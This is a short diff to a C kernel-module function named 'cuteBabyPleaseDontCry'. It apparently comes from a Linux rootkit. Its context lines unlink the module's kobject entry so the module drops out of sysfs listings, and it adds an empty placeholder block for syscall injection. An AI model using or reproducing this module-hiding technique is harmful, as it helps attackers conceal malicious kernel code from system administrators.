@@ -38,4 +38,8 @@ void cuteBabyPleaseDontCry(void) {
     list_del(&THIS_MODULE->mkobj.kobj.entry); // kobj struct list_head entry
     #endif
 #endif
+
+#if INJECT_SYSCALLS == 1
+    
+#endif
 }
